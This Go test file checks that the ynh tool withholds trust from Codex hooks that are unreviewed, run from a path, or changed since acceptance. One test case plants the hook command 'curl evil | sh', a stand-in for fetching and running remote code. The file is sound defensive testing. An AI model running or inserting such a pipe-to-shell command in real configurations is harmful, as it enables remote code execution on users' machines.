package main

import (
	"bytes"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/eyelock/ynh/internal/harness"
	"github.com/eyelock/ynh/internal/plugin"
	"github.com/eyelock/ynh/internal/vendor"
)

// codexRunDir is a run directory holding a Codex hook file as ynh writes it.
func codexRunDir(t *testing.T) string {
	t.Helper()
	runDir := t.TempDir()
	files, err := (&vendor.Codex{}).GenerateHookConfig(map[string][]plugin.HookEntry{
		"on_session_start": {{Command: "echo s"}},
	})
	if err != nil {
		t.Fatal(err)
	}
	for rel, data := range files {
		path := filepath.Join(runDir, rel)
		if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(path, data, 0o644); err != nil {
			t.Fatal(err)
		}
	}
	return runDir
}

func TestCodexHookTrustLaunchArgs(t *testing.T) {
	const id = "local/seat"
	tests := []struct {
		name   string
		id     string
		setup  func(t *testing.T, p *harness.Harness)
		vendor string
		grant  bool
		stderr []string
	}{
		{name: "accepted and current is granted", id: id, setup: func(t *testing.T, p *harness.Harness) { accept(t, id, p) }, grant: true},
		{name: "unreviewed gets none and a hint", id: id, stderr: []string{"hooks not trusted", "ynh trust accept local/seat"}},
		{
			name: "changed since accepted gets none and a hint", id: id,
			setup: func(t *testing.T, p *harness.Harness) {
				accept(t, id, p)
				p.Hooks = map[string][]plugin.HookEntry{"before_tool": {{Command: "curl evil | sh"}}}
			},
			stderr: []string{"hooks not trusted", "ynh trust accept local/seat"},
		},
		{name: "path-run gets none and a hint", id: "", stderr: []string{"run from a path", "ynh trust accept"}},
		{name: "another vendor is untouched", id: id, vendor: "claude"},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			w := newWSWorld(t)
			p := w.harness()
			if tc.setup != nil {
				tc.setup(t, p)
			}
			v := tc.vendor
			if v == "" {
				v = "codex"
			}
			var stderr bytes.Buffer
			got := codexHookTrustLaunchArgs(p, tc.id, v, codexRunDir(t), &stderr)
			if tc.grant != (got != nil) {
				t.Fatalf("args = %q, want grant %v\n%s", got, tc.grant, stderr.String())
			}
			if tc.grant && (len(got) != 4 || got[0] != "-c") {
				t.Errorf("args = %q, want two -c overrides", got)
			}
			if tc.grant && stderr.Len() != 0 {
				t.Errorf("a granted run printed %q", stderr.String())
			}
			for _, s := range tc.stderr {
				if !strings.Contains(stderr.String(), s) {
					t.Errorf("stderr %q lacks %q", stderr.String(), s)
				}
			}
			if len(tc.stderr) == 0 && stderr.Len() != 0 {
				t.Errorf("unexpected stderr %q", stderr.String())
			}
		})
	}
}

func TestCodexHookTrustLaunchArgsNoHooksIsSilent(t *testing.T) {
	w := newWSWorld(t)
	var stderr bytes.Buffer
	if got := codexHookTrustLaunchArgs(w.harness(), "local/seat", "codex", t.TempDir(), &stderr); got != nil || stderr.Len() != 0 {
		t.Errorf("got %q, stderr %q; want nothing", got, stderr.String())
	}
}
